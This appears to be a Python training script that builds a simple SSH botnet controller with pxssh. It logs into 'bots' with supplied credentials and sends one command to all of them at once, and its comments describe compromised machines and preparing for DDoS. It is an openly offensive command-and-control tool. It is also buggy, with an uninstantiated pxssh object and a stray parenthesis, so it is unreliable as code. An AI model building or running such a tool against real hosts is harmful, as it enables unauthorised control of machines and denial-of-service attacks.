import pxssh

# classes are used to define new type which are complex to be represented by existing types like list, dict etc
class Client:  # a new type for a client/bot with various attributes and functions defining it.
    def __init__(self, host, username, password):
        self.host = host
        self.user = username
        self.password = password # we are essentially defining object attribute and matching them with arguments
        self.session = self.bot_connect() # this  attribute is a result of object function

    def bot_connect(self): # object function = method

        try:
            s = pxssh.pxssh  # creating object s from pxssh module
            s.login(self.host, self.user, self.password)
            return s  # after successful login, return s as in session
        except Exception as e:
            print(e) #print exception error with message
            print('Error connecting to bot machine, please check creds')

    def send_command(self, cmd): #object function-hypothetical if we could send commands through ssh session, it would look like this
        self.session.sendline(cmd)
        self.session.prompt() #equivalent to pressing enter on the sent command
        return self.session.before # before variable stores the output from command

#these global functions below is class independed
def add_bot(host, username, password):
    bot1 = Client(host, username, password)
    botnet.append(bot1)

def bot_command(command):
    for bot in botnet:
        output = bot.send_command(command)
        print("Output from:" + bot.host)
        print(output)

# core functionality is to send a command to all bots at once - prepare for ddos etc
botnet = [] # empty botnet for now
#bot1 = Client(127.0.0.1, kali, kali)
add_bot(("127.0.0.1", "kali", "kali") # machines compromised will be added to botnet list
#print(botnet.items())
bot_command("ls_alt")  # we can input command from arguments as well when file is executed










